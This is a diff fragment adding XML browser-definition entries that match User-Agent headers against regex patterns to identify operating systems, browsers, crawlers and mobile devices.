+</Browser>
+<Browser Id="1070" ParentId="1065" Prority="" Name="Linux">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:linux)" />
+  <Capability Name="OS" Value="Linux" />
+  <Child Id="1111" Name="AndroidOS" Type="Browser" />
+</Browser>
+<Browser Id="1071" ParentId="1065" Prority="" Name="BSD">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:bsd)" />
+  <Child Id="1112" Name="FreeBSD" Type="Browser" />
+  <Child Id="1114" Name="NetBSD" Type="Browser" />
+  <Child Id="1113" Name="OpenBSD" Type="Browser" />
+</Browser>
+<Browser Id="1072" ParentId="1065" Prority="" Name="SunOS">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8" />
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:SunOS)" />
+  <Capability Name="OS" Value="SunOS" />
+</Browser>
+<Browser Id="1073" ParentId="1065" Prority="" Name="OS2">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (OS/2; Warp 4.5; rv:45.0) Gecko/20100101 Firefox/45.0 SeaMonkey/2.42.9esr" />
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:OS/2)" />
+  <Capability Name="OS" Value="OS2" />
+  <Child Id="1115" Name="OS2Warp" Type="Browser" />
+</Browser>
+<Browser Id="1074" ParentId="1065" Prority="" Name="IRIX">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s: IRIX )|(?i-s: IRIX64 )" />
+  <Capability Name="OS" Value="SGI IRIX" />
+</Browser>
+<Browser Id="1075" ParentId="1065" Prority="" Name="AmigaOS">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:AmigaOS)|(?i-s:Amiga OS)" />
+  <Capability Name="OS" Value="AmigaOS" />
+  <Child Id="1116" Name="AmigaOS3" Type="Browser" />
+  <Child Id="1117" Name="AmigaOS4" Type="Browser" />
+</Browser>
+<Browser Id="1076" ParentId="1065" Prority="" Name="SymbianOS">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es70" />
+  <Identification Type="Header" Name="User-Agent" Match="SymbianOS|(?i-s:Symbian OS)" />
+  <Capability Name="OS" Value="SymbianOS" />
+</Browser>
+<Browser Id="1077" ParentId="1065" Prority="" Name="OSF1alpha">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:OSF1 alpha)|(?i-s:OSF1 .* alpha)" />
+  <Capability Name="OS" Value="OSF1" />
+</Browser>
+<Browser Id="1078" ParentId="1065" Prority="" Name="BeOS">
+  <Samples Name="User-Agent" Value="Mozilla/3.0 (compatible; NetPositive/2.2.1; BeOS)" />
+  <Identification Type="Header" Name="User-Agent" Match="BeOS" />
+  <Capability Name="OS" Value="BeOS" />
+</Browser>
+<Browser Id="1079" ParentId="1065" Prority="" Name="HPUX">
+  <Identification Type="Header" Name="User-Agent" Match="HP-UX" />
+  <Capability Name="OS" Value="HP-UX 9000" />
+</Browser>
+<Browser Id="1080" ParentId="1065" Prority="" Name="AIX">
+  <Identification Type="Header" Name="User-Agent" Match=" AIX " />
+  <Capability Name="OS" Value="AIX" />
+</Browser>
+<Browser Id="1081" ParentId="1065" Prority="" Name="OpenVMS">
+  <Identification Type="Header" Name="User-Agent" Match=" OpenVMS " />
+  <Capability Name="OS" Value="OpenVMS" />
+</Browser>
+<Browser Id="1082" ParentId="1065" Prority="" Name="Dreamcast">
+  <Samples Name="User-Agent" Value="Mozilla/3.0 (Planetweb/2.100 JS SSL US; Dreamcast US)" />
+  <Identification Type="Header" Name="User-Agent" Match=" Dreamcast " />
+  <Capability Name="OS" Value="Dreamcast" />
+</Browser>
+<Browser Id="1083" ParentId="1065" Prority="" Name="Commodore">
+  <Identification Type="Header" Name="User-Agent" Match=" Commodore " />
+  <Capability Name="OS" Value="Commodore" />
+</Browser>
+<Browser Id="1084" ParentId="1065" Prority="" Name="PalmOS">
+  <Samples Name="User-Agent" Value="Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/Palm-D052; Blazer/4.5) 16;320x320" />
+  <Identification Type="Header" Name="User-Agent" Match="PalmOS|PalmSource" />
+  <Capability Name="OS" Value="PalmOS" />
+</Browser>
+<Browser Id="1085" ParentId="1065" Prority="" Name="Nintendo">
+  <Samples Name="User-Agent" Value="Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)" />
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.9 NintendoBrowser/4.2.0.11146.US" />
+  <Identification Type="Header" Name="User-Agent" Match="Nintendo" />
+  <Capability Name="OS" Value="Nintendo" />
+  <Child Id="1119" Name="NintendoDS" Type="Browser" />
+  <Child Id="1118" Name="NintendoWii" Type="Browser" />
+</Browser>
+<Browser Id="1086" ParentId="1065" Prority="" Name="OperaMiniOS">
+  <Identification Type="Header" Name="X-OperaMini-Phone-UA" Match="(?'Andriod'Android\s\d+\.\d+(?:[.\-]([a-z0-9]+)))|(?'Andriod'Android\s\d+\.\d+)" />
+  <Capability Name="OS" Value="${Andriod}" />
+</Browser>
+<Browser Id="1087" ParentId="1065" Prority="" Name="AndroidGeneric">
+  <Identification Type="Header" Name="User-Agent" Match="(?'OS'Android\s\d+(\.\d+(\.\d)?)?)" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="(?i-s:crawler|bot|spider|larbin|search|indexer|archiver|heritrix|HttpClient|Nutch|libwww|Ask\sJeeves|thumbnails|CerberianDrtrs|Cerberian Drtrs|Bluecoat\sDRTR|Slurp|HTTrack|Indy\sLibrary|picmole|research\sproject|WebCapture|ScanAlert|Xenu|Sleuth|Mozlila)" />
+  <Capture Type="Header" Name="User-Agent" Match="Android\s\d+\.\d+(\.\d+)?;\s(?'deviceID'[^)]*)" />
+  <Capability Name="OS" Value="${OS}" />
+  <Capability Name="isMobileDevice" Value="true" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+</Browser>
+<Browser Id="1088" ParentId="1065" Prority="" Name="FireFoxOS">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s(\(Tablet;|\(Mobile;)(.*|\s)rv:\d+\.\d+\)\sGecko/\d+\.\d+\sFirefox\/\d+\.\d+" />
+  <Capability Name="OS" Value="Firefox OS" />
+</Browser>
+<Browser Id="1089" ParentId="1066" Prority="" Name="Windows55">
+  <Identification Type="Header" Name="User-Agent" Match="Windows NT 5\.5" />
+  <Capability Name="OS" Value="Unknown" />
+</Browser>
+<Browser Id="1090" ParentId="1066" Prority="" Name="WindowsXP">
+  <Identification Type="Header" Name="User-Agent" Match="Windows XP|Windows NT 5\.1|WinNT 5\.1" />
+  <Capability Name="OS" Value="Microsoft Windows XP" />
+</Browser>
+<Browser Id="1091" ParentId="1066" Prority="" Name="Windows2000">
+  <Identification Type="Header" Name="User-Agent" Match="Windows 2000|Windows NT 5\.0|WinNT 5\.0" />
+  <Capability Name="OS" Value="Microsoft Windows 2000" />
+</Browser>
+<Browser Id="1092" ParentId="1066" Prority="" Name="WindowsME">
+  <Identification Type="Header" Name="User-Agent" Match="Windows ME|Win 9x 4\.90|Windows 4\.90|WinME" />
+  <Capability Name="OS" Value="Microsoft Windows ME" />
+</Browser>
+<Browser Id="1093" ParentId="1066" Prority="" Name="Windows98">
+  <Identification Type="Header" Name="User-Agent" Match="Windows 98|Win98|Windows 4\.10" />
+  <Capability Name="OS" Value="Microsoft Windows 98" />
+  <Child Id="1120" Name="WindowsME2" Type="Browser" />
+</Browser>
+<Browser Id="1094" ParentId="1066" Prority="" Name="Windows95">
+  <Identification Type="Header" Name="User-Agent" Match="Windows 95|Win95" />
+  <Capability Name="OS" Value="Microsoft Windows 95" />
+</Browser>
+<Browser Id="1095" ParentId="1066" Prority="" Name="Windows52">
+  <Identification Type="Header" Name="User-Agent" Match="Windows NT 5\.2" />
+  <Capability Name="OS" Value="Windows Server 2003" />
+</Browser>
+<Browser Id="1096" ParentId="1066" Prority="" Name="Windows60">
+  <Identification Type="Header" Name="User-Agent" Match="Windows NT 6\.0|WinNT 6\.0" />
+  <Capability Name="OS" Value="Microsoft Windows Vista" />
+</Browser>
+<Browser Id="1097" ParentId="1066" Prority="" Name="WindowsVista">
+  <Identification Type="Header" Name="User-Agent" Match="Windows Vista" />
+  <Capability Name="OS" Value="Microsoft Windows Vista" />
+</Browser>
+<Browser Id="1098" ParentId="1066" Prority="" Name="Windows61">
+  <Identification Type="Header" Name="User-Agent" Match="Windows NT 6\.1|WinNT 6\.1" />
+  <Capability Name="OS" Value="Microsoft Windows 7" />
+</Browser>
+<Browser Id="1099" ParentId="1066" Prority="" Name="Windows62">
+  <Identification Type="Header" Name="User-Agent" Match="Windows NT 6\.2|WinNT 6\.2" />
+  <Capability Name="OS" Value="Microsoft Windows 8" />
+</Browser>
+<Browser Id="1100" ParentId="1066" Prority="" Name="Windows63">
+  <Identification Type="Header" Name="User-Agent" Match="Windows NT 6\.3|WinNT 6\.3" />
+  <Capability Name="OS" Value="Microsoft Windows 8.1" />
+</Browser>
+<Browser Id="1101" ParentId="1066" Prority="" Name="Windows7">
+  <Identification Type="Header" Name="User-Agent" Match="Windows NT 6\.1|WinNT 6\.1" />
+  <Capability Name="OS" Value="Microsoft Windows 7" />
+</Browser>
+<Browser Id="1102" ParentId="1066" Prority="" Name="WindowsNT4">
+  <Identification Type="Header" Name="User-Agent" Match="WinNT4\.0|Windows NT 4\.0|NT4\.0" />
+  <Capability Name="OS" Value="Microsoft Windows 4.0" />
+</Browser>
+<Browser Id="1103" ParentId="1066" Prority="" Name="WindowsNT351">
+  <Identification Type="Header" Name="User-Agent" Match="Windows NT 3.51" />
+  <Capability Name="OS" Value="Microsoft Windows 3.51" />
+</Browser>
+<Browser Id="1104" ParentId="1066" Prority="" Name="Windows311">
+  <Identification Type="Header" Name="User-Agent" Match="16bit|Windows 3\.1|Win16" />
+  <Capability Name="OS" Value="Microsoft Windows 3.11" />
+</Browser>
+<Browser Id="1105" ParentId="1066" Prority="" Name="WindowsCE">
+  <Identification Type="Header" Name="User-Agent" Match="Windows CE|WinCE" />
+  <Capability Name="OS" Value="Microsoft Windows CE" />
+  <Child Id="1121" Name="WindowsCE2003" Type="Browser" />
+</Browser>
+<Gateway Id="1106" ParentId="1066" Prority="" Name="win64">
+  <Identification Type="Header" Name="User-Agent" Match="Win64" />
+  <Capability Name="win32" Value="false" />
+  <Capability Name="win64" Value="true" />
+</Gateway>
+<Browser Id="1107" ParentId="1068" Prority="" Name="MacintoshOSX">
+  <Identification Type="Header" Name="User-Agent" Match="Mac OS X" />
+  <Capability Name="OS" Value="Macintosh OS X" />
+  <Child Id="1126" Name="IOS2" Type="Browser" />
+  <Child Id="1122" Name="iOS" Type="Browser" />
+</Browser>
+<Browser Id="1108" ParentId="1068" Prority="" Name="Macintosh68K">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:Mac_68000)|(?i-s:Macintosh.*68K)" />
+  <Capability Name="OS" Value="Macintosh 68K" />
+</Browser>
+<Browser Id="1109" ParentId="1068" Prority="" Name="MacintoshDarwin">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:Darwin .* Power\sMacintosh)|(?i-s:powerpc-apple-darwin)" />
+  <Capability Name="OS" Value="Macintosh Darwin" />
+</Browser>
+<Browser Id="1110" ParentId="1068" Prority="" Name="MacintoshPPC">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:Mac_PowerPC)|(?i-s:Mac_PPC)|(?i-s:Macintosh.*PPC)|(?i-s:PPC Mac)" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="(?i-s:Mac OS X)" />
+  <Capability Name="OS" Value="Macintosh PPC" />
+</Browser>
+<Browser Id="1111" ParentId="1070" Prority="" Name="AndroidOS">
+  <Identification Type="Header" Name="User-Agent" Match="(?'Andriod'Android\s\d+\.\d+(?:[.\-]([a-z0-9]+)))|(?'Andriod'Android\s\d+\.\d+)" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="(?i-s:crawler|bot|spider|larbin|search|indexer|archiver|heritrix|HttpClient|Nutch|libwww|Ask\sJeeves|thumbnails|CerberianDrtrs|Cerberian Drtrs|Bluecoat\sDRTR|Slurp|HTTrack|Indy\sLibrary|picmole|research\sproject|WebCapture|ScanAlert|Xenu|Sleuth|Mozlila)" />
+  <Capability Name="OS" Value="${Andriod}" />
+</Browser>
+<Browser Id="1112" ParentId="1071" Prority="" Name="FreeBSD">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.8.1.12) Gecko/20080214 Firefox/2.0.0.12" />
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:freebsd)" />
+  <Capability Name="OS" Value="FreeBSD" />
+</Browser>
+<Browser Id="1113" ParentId="1071" Prority="" Name="OpenBSD">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (compatible; Konqueror/4.1; OpenBSD) KHTML/4.1.4 (like Gecko)" />
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" />
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:OpenBSD)" />
+  <Capability Name="OS" Value="OpenBSD" />
+</Browser>
+<Browser Id="1114" ParentId="1071" Prority="" Name="NetBSD">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15" />
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:NetBSD)" />
+  <Capability Name="OS" Value="NetBSD" />
+</Browser>
+<Browser Id="1115" ParentId="1073" Prority="" Name="OS2Warp">
+  <Identification Type="Header" Name="User-Agent" Match="OS/2; U; Warp 4.5;" />
+  <Capability Name="OS" Value="OS2 Warp 4.5" />
+</Browser>
+<Browser Id="1116" ParentId="1075" Prority="" Name="AmigaOS3">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:AmigaOS.3\.9)" />
+  <Capability Name="OS" Value="AmigaOS 3.9" />
+</Browser>
+<Browser Id="1117" ParentId="1075" Prority="" Name="AmigaOS4">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:AmigaOS4\.0)" />
+  <Capability Name="OS" Value="AmigaOS 4.0" />
+</Browser>
+<Browser Id="1118" ParentId="1085" Prority="" Name="NintendoWii">
+  <Samples Name="User-Agent" Value="Opera/9.30 (Nintendo Wii; U; ; 3642; en)" />
+  <Identification Type="Header" Name="User-Agent" Match="Nintendo Wii" />
+  <Capability Name="OS" Value="Nintendo Wii" />
+</Browser>
+<Browser Id="1119" ParentId="1085" Prority="" Name="NintendoDS">
+  <Identification Type="Header" Name="User-Agent" Match="Nintendo DS" />
+  <Capability Name="OS" Value="Nintendo DS" />
+</Browser>
+<Browser Id="1120" ParentId="1093" Prority="" Name="WindowsME2">
+  <Identification Type="Header" Name="User-Agent" Match="Windows ME|Win 9x 4\.90|Windows 4\.90|WinME" />
+  <Capability Name="OS" Value="Microsoft Windows ME" />
+</Browser>
+<Browser Id="1121" ParentId="1105" Prority="" Name="WindowsCE2003">
+  <Identification Type="Header" Name="User-Agent" Match="Windows CE 4\.21" />
+  <Capability Name="OS" Value="Microsoft Windows Mobile 2003" />
+</Browser>
+<Browser Id="1122" ParentId="1107" Prority="" Name="iOS">
+  <Identification Type="Header" Name="User-Agent" Match="CPU\sOS\s(?'majoros'\d+)_(?'minoros'\d+)" />
+  <Capability Name="OS" Value="iOS ${majoros}.${minoros}" />
+</Browser>
+<Browser Id="1123" ParentId="1066" Prority="" Name="Windows 10">
+  <Identification Type="Header" Name="User-Agent" Match="Windows\sNT\s10\.\d+|WinNT 10\.\d+" />
+  <Capability Name="OS" Value="Microsoft Windows 10" />
+</Browser>
+<Browser Id="1124" ParentId="1066" Prority="" Name="Windows 11">
+  <Identification Type="Header" Name="User-Agent" Match="Windows NT 11\.0|WinNT 11\.0" />
+  <Capability Name="OS" Value="Microsoft Windows 11" />
+</Browser>
+<Browser Id="1125" ParentId="1029" Prority="" Name="Edg">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 Edg/94.0.992.47" />
+  <Identification Type="Header" Name="User-Agent" Match=" Edg/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match=" Chrome/(?'Chromeversion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Microsoft Edge" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="Chromeversion" Value="${Chromeversion}" />
+</Browser>
+<Browser Id="1126" ParentId="1107" Prority="" Name="IOS2">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1" />
+  <Identification Type="Header" Name="User-Agent" Match="like Mac OS X" />
+  <Capability Name="OS" Value="iOS" />
+</Browser>
+<Browser Id="1127" ParentId="1029" Prority="" Name="Opera Chrome">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 OPR/80.0.4170.63" />
+  <Identification Type="Header" Name="User-Agent" Match="OPR/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match=" AppleWebKit/(?'appleWebTechnologyVersion'(\d+\.\d+(\.\d+)?))" />
+  <Capture Type="Header" Name="User-Agent" Match="Chrome/(?'Chromeversion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Opera" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="layoutEngine" Value="Blink" />
+  <Capability Name="appleWebTechnologyVersion" Value="${appleWebTechnologyVersion}" />
+  <Capability Name="Chromeversion" Value="${Chromeversion}" />
+</Browser>
+<Browser Id="1128" ParentId="851" Prority="" Name="CriOS Desktop">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/85 Version/11.1.1 Safari/605.1.15" />
+  <Identification Type="Header" Name="User-Agent" Match="CriOS/((?'version'\d+\.\d+(\.\d+)?))|CriOS/(?'version'\d+)" />
+  <Capability Name="browser" Value="Chrome Mobile" />
+  <Capability Name="version" Value="${version}.0" />
+  <Capability Name="OS" Value="iOS" />
+</Browser>
+<Browser Id="1129" ParentId="883" Prority="" Name="Bytespider">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; spider-feedback@bytedance.com)" />
+  <Identification Type="Header" Name="User-Agent" Match="Bytespider" />
+  <Capability Name="browser" Value="Bytespider" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="OS" Value="Unknown" />
+</Browser>
+<Browser Id="1130" ParentId="1029" Prority="" Name="QQBrowser">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2776.145 Safari/537.36 Core/1.70.3722.400 QQBrowser/10.5.3739.400" />
+  <Identification Type="Header" Name="User-Agent" Match="QQBrowser/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="QQBrowser" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1131" ParentId="993" Prority="" Name="QQBrowser2">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2776.145 Safari/537.36 Core/1.70.3722.400 QQBrowser/10.5.3739.400" />
+  <Identification Type="Header" Name="User-Agent" Match="QQBrowser/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="QQBrowser" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1132" ParentId="856" Prority="" Name="Opera Linux">
+  <Samples Name="User-Agent" Value="Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10" />
+  <Identification Type="Header" Name="User-Agent" Match="Opera\s(?'version'\d+\.\d+)" />
+  <Capability Name="browser" Value="Opera" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1133" ParentId="799" Prority="" Name="certifytheweb.com">
+  <Samples Name="cf-worker" Value="certifytheweb.com" />
+  <Identification Type="Header" Name="cf-worker" Match="certifytheweb\.com" />
+  <Capability Name="browser" Value="certifytheweb.com" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="isMobileDevice" Value="False" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="1134" ParentId="915" Prority="" Name="AppleWebKitSymbianOSNokia2">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es70" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/413\s(?'deviceModel'[^/]*)" />
+  <Capability Name="mobileDeviceModel" Value="Nokia ${deviceModel}" />
+  <Capability Name="browser" Value="Nokia Browser" />
+  <Capability Name="mobileDeviceManufacturer" Value="Nokia" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="1135" ParentId="993" Prority="" Name="UCBrowser">
+  <Identification Type="Header" Name="User-Agent" Match="UCBrowser/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="UCBrowser" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1136" ParentId="799" Prority="" Name="Dalvik">
+  <Identification Type="Header" Name="User-Agent" Match="Dalvik/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match="Android\s\d+\.\d+(\.\d+)?;\s(?'deviceID'[^)]*)" />
+  <Capability Name="browser" Value="Dalvik" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="false" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+</Browser>
+<Browser Id="1137" ParentId="883" Prority="" Name="SemanticScholarBot">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)" />
+  <Identification Type="Header" Name="User-Agent" Match="SemanticScholarBot" />
+  <Capability Name="browser" Value="SemanticScholarBot" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="1138" ParentId="883" Prority="" Name="Amazonbot">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot)" />
+  <Identification Type="Header" Name="User-Agent" Match="Amazonbot/(?'version'\d+\.\d+)" />
+  <Capability Name="browser" Value="Amazonbot" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1139" ParentId="883" Prority="" Name="Mail.RU_Bot">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Robots/2.0; +https://help.mail.ru/webmaster/indexing/robots)" />
+  <Identification Type="Header" Name="User-Agent" Match="Mail.RU_Bot/Robots/(?'version'\d+\.\d+)" />
+  <Capability Name="browser" Value="Mail.RU_Bot" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1140" ParentId="883" Prority="" Name="Screaming Frog SEO Spider">
+  <Samples Name="User-Agent" Value="Screaming Frog SEO Spider/14.3" />
+  <Identification Type="Header" Name="User-Agent" Match="Screaming\sFrog\sSEO\sSpider/(?'version'\d+\.\d+)" />
+  <Capability Name="browser" Value="Screaming Frog SEO Spider" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1141" ParentId="883" Prority="" Name="DomCopBot">
+  <Samples Name="User-Agent" Value="DomCopBot (https://www.domcop.com/bot)" />
+  <Identification Type="Header" Name="User-Agent" Match="DomCopBot" />
+  <Capability Name="browser" Value="DomCopBot" />
+</Browser>
+<Browser Id="1142" ParentId="883" Prority="" Name="IonCrawl">
+  <Samples Name="User-Agent" Value="IonCrawl (https://www.ionos.de/terms-gtc/faq-crawler-en/)" />
+  <Identification Type="Header" Name="User-Agent" Match="IonCrawl" />
+  <Capability Name="browser" Value="IonCrawl" />
+</Browser>
+<Browser Id="1143" ParentId="883" Prority="" Name="Nicecrawler">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Nicecrawler/1.1; +http://www.nicecrawler.com/) Chrome/90.0.4430.97 Safari/537.36" />
+  <Identification Type="Header" Name="User-Agent" Match="Nicecrawler/(?'version'\d+\.\d+)" />
+  <Capability Name="browser" Value="Nicecrawler" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1144" ParentId="853" Prority="0" Name="Mozilla_Trident7">
+  <Identification Type="Header" Name="User-Agent" Match="Trident/7\.0" />
+  <Capability Name="browser" Value="Microsoft Internet Explorer" />
+  <Capability Name="version" Value="11.0" />
+  <Capability Name="layoutEngineVersion" Value="7.0" />
+  <Capability Name="layoutEngine" Value="Trident" />
+</Browser>
+<Browser Id="1145" ParentId="853" Prority="" Name="Mozilla_Trident4">
+  <Identification Type="Header" Name="User-Agent" Match="Trident/4\.0" />
+  <Capability Name="browser" Value="Microsoft Internet Explorer" />
+  <Capability Name="version" Value="8.0" />
+  <Capability Name="layoutEngine" Value="Trident" />
+  <Capability Name="layoutEngineVersion" Value="4.0" />
+</Browser>
+<Browser Id="1146" ParentId="914" Prority="" Name="EdgA">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Build/NDQS26.69-64-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/41.0.0.1921" />
+  <Identification Type="Header" Name="User-Agent" Match=" EdgA/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match=" Chrome/(?'Chromeversion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Microsoft Edge" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="Chromeversion" Value="${Chromeversion}" />
+</Browser>
+<Browser Id="1147" ParentId="914" Prority="" Name="Edge">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (MSIE 9.0; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299" />
+  <Identification Type="Header" Name="User-Agent" Match=" Edge/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match=" Chrome/(?'Chromeversion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Microsoft Edge Legacy" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="Chromeversion" Value="${Chromeversion}" />
+  <Capability Name="layoutEngine" Value="Trident" />
+  <Capability Name="layoutEngineVersion" Value="${version}" />
+</Browser>
+<Browser Id="1148" ParentId="883" Prority="" Name="TweetmemeBot">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (TweetmemeBot/4.0; +http://datasift.com/bot.html) Gecko/20100101 Firefox/31.0" />
+  <Identification Type="Header" Name="User-Agent" Match="TweetmemeBot/(?'version'\d+\.\d+)" />
+  <Capability Name="browser" Value="TweetmemeBot" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1149" ParentId="883" Prority="" Name="Tailrank">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2.1; aggregator:Tailrank; http://tailrank.com/robot) Gecko/20021130" />
+  <Identification Type="Header" Name="User-Agent" Match="aggregator:Tailrank" />
+  <Capture Type="Header" Name="User-Agent" Match="rv:(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Tailrank" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1150" ParentId="883" Prority="" Name="LightspeedSystemsCrawler">
+  <Samples Name="User-Agent" Value="LightspeedSystemsCrawler Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)" />
+  <Identification Type="Header" Name="User-Agent" Match="LightspeedSystemsCrawler" />
+  <Capability Name="browser" Value="LightspeedSystemsCrawler" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="1151" ParentId="799" Prority="" Name="lkxscan">
+  <Samples Name="User-Agent" Value="lkxscan/v0.1.0 (+https://leakix.net) l9explore/v1.0.0 (+https://github.com/LeakIX/l9explore)" />
+  <Identification Type="Header" Name="User-Agent" Match="lkxscan/v(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="lkxscan" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="isMobileDevice" Value="False" />
+  <Capability Name="OS" Value="Unknown" />
+</Browser>
+<Browser Id="1152" ParentId="820" Prority="" Name="Xenu Link Sleuth">
+  <Samples Name="User-Agent" Value="Xenu Link Sleuth/1.3.8" />
+  <Identification Type="Header" Name="User-Agent" Match="Xenu Link Sleuth/(?'version'\d+\.\d+(\.\d+))" />
+  <Capability Name="browser" Value="Xenu Link Sleuth" />
